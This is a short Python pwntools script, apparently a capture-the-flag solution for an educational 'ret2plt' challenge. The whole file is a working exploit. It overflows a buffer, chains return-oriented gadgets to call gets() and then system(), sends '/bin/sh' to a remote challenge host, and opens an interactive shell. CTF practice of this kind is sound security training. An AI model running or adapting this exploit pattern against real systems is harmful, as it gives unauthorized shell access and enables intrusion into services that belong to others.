#coding=utf-8
from pwn import *

system = p64(0x400520)
gets = p64(0x400530)
bss = p64(0x601000)

# pop rdi ; ret
pop_rdi = p64(0x0000000000400733)

payload = 'a' * 0x38
payload += pop_rdi + bss + gets
payload += pop_rdi + bss
payload += system

#r = process('./ret2plt')
r = remote('edu-ctf.csie.org', 10174)
#gdb.attach(r)
r.recvuntil(':D')
r.sendline(payload)
r.sendline('/bin/sh\0')
r.interactive()
